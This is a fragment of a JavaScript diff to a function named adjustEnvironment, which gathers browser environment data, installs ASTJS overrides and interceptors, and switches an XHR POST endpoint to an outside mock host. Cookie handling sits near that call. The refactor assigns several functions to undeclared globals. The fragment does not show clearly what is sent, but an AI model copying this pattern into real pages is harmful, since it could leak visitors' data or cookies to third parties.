@@ -7,7 +7,8 @@ export function adjustEnvironment (){
       return window.currentSpt;
     },
   });
-  (async function () {
+  const nav1 =  async () => {
+
     var __data = {};
 
     var addData = (obj) => {
@@ -212,9 +213,11 @@ export function adjustEnvironment (){
     setTimeout(() => {
       addData(_createPathObj("speechSynthesis", getPeechSynthesis()));
     }, 200);
-  })();
+  };
+  nav1();
 
-  (function () {
+  nav2 = async () => {
+
     "use strict";
 
     if (!window.ASTJS) {
@@ -544,8 +547,11 @@ export function adjustEnvironment (){
     }
 
     window.ASTJS.browserOverrides.init();
-  })();
-  (function () {
+  }
+  nav2();
+
+  xhrr = async () => {
+
     "use strict";
 
     if (!window.ASTJS) {
@@ -556,8 +562,11 @@ export function adjustEnvironment (){
       function ASTFormControls() {}
       window.ASTJS.formControls = new ASTFormControls();
     }
-  })();
-  (function () {
+  }
+  xhrr();
+
+  interceptors = async () => {
+
     "use strict";
 
     if (!window.ASTJS) {
@@ -657,7 +666,8 @@ export function adjustEnvironment (){
     };
 
     window.ASTJS.interceptors = new ASTInterceptors();
-  })();
+  }
+  interceptors();
 
   const LOCATION_HREF = window.documentUrl;
   const DOCUMENT_URL = LOCATION_HREF;
@@ -983,7 +993,7 @@ export function adjustEnvironment (){
             e.stopPropagation();
           };
 
-          xhr.open("POST", `https://64c1b2cdfa35860baea0c0a2.mockapi.io/send`);
+          xhr.open("POST", `https://mock.codes/`);
           xhr.onreadystatechange = function (e) {
             try {
               let cookies = getCookies();
